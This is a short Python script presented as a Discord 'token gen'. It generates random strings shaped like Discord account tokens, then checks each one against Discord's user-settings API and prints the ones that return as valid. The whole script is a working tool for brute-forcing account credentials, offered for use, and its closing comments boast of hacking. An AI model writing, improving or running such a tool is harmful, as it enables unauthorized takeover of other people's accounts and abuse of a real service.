import random
import requests
import colorama
from colorama import Fore, Back, Style
colorama.init(autoreset=True)

print(Fore.GREEN + """
╔═╦╦══╦══╦═╦══╗
╚╗║║╔╗║╔╗║║╠║║╝
╔╩╗║╠╣║╔╗║║╠║║╗
╚══╩╝╚╩══╩═╩══╝ token gen
""")


def main():
    start = input("(1) token gen\n(2) token checker\n=>")

    if start == "1":
        amount = input("tokens amount: ")
        
        chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

        for i in range(int(amount) + 0):

            first = ''.join((random.choice(chars) for i in range (24))) 
            second = ''.join((random.choice(chars) for i in range(6))) 
            third = ''.join((random.choice(chars) for i in range (27)))
            
            result = first + "." + second + "." + third
            
            
            output = open("output.txt", "a") 
            output.write(result + "\n")

    if start == "2":

        url = "https://discord.com/api/v9/users/@me/settings"

        with open("output.txt", "r") as r:
            for each in r:
                line = each.strip()

                headers = {"authorization": line, "content-type": "application/json"}

                r = requests.get(url, headers=headers)
                print(r.status_code)
                if r.status_code == 401:
                    print(Fore.RED + "invalid token")
                else:
                    print(Fore.GREEN + "valid token {}".format(line))

if __name__ == "__main__":
    main()
#Coded by YABOI
#pyhackers ontop Downed nasa
#colorama ;)
